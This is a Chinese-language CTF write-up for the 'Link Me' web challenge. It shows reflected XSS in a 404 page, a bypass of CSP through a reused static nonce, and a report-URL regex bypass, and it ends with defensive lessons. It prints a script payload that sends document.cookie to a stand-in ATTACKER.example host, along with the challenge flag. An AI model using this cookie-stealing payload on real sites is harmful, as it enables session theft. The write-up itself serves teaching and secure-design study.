# Link Me

## 题目简述

任意未知路径会把 URL 解码后直接反射到 404 页面，形成 XSS，但站点设置 CSP：default-src none; script-src 'nonce-NONCE'。NONCE 是全局变量，服务启动后保持不变，并在正常首页响应头中公开；把同一个 nonce 放进注入的 script 标签即可绕过 CSP。

## 解题过程

先 GET /，从 Content-Security-Policy 响应头复制 nonce。随后构造一个 404 路径，解码后内容为：

~~~html
<script nonce="COPIED_NONCE">
location = "https://ATTACKER.example/collect?c=" +
  encodeURIComponent(document.cookie)
</script>
~~~

整个标签需作为路径进行 URL 编码。adminbot 把 Cookie 设置在 localhost 域、端口 8989，因此上报给机器人的是：

~~~text
http://localhost:8989/ENCODED_PAYLOAD
~~~

报告接口的 URL 正则要求字符串中出现带点的域名；payload 内的 ATTACKER.example 同样会被该正则扫描到，从而使整个 localhost URL 通过。机器人访问 404 页面时，响应仍使用同一个全局 nonce，脚本被 CSP 放行并外传 Cookie：

~~~text
maple{1_H4ve_gr0ssly_misunderst0od_hoW_CsPs_w0rk}
~~~

## 方法总结

CSP nonce 必须高熵、每个响应重新生成，并且只能赋给可信脚本。一个长期复用且可从其他页面读取的 nonce 只是可复制口令。URL 校验也不应使用“字符串中任意位置匹配域名”的正则，应解析 URL 后对 scheme、hostname、port 和重定向链分别校验。
